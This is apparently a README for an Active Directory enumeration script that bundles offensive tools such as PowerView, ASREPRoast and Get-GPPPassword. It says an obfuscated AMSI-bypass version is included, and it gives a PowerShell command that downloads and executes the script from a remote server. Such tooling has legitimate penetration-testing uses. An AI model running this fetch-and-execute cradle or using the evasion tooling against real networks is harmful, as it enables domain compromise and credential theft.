## What is this?
ADEN is a local enumeration script for active directory environments, it is a carefully put together merge of several enumeration and exploitation projects:

- PowerView
- PowerMad
- ASREPRoast
- Get-GPPPassword
- PowerUpSQL



It is to be used as an all-in-one enumeration script to use when you are in a domain user's session. I've also included an obfuscated version to bypass AMSI.\
\
Big credits to all the authors of the above mentioned tools! You are awesome.

## How to use?
From a domain's user powershell session:
```powershell
iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-ADEnum
```
The script will perform a number of checks that you can directly see on a clear output. Of course, you also have access to all the functions of the mentioned scripts.
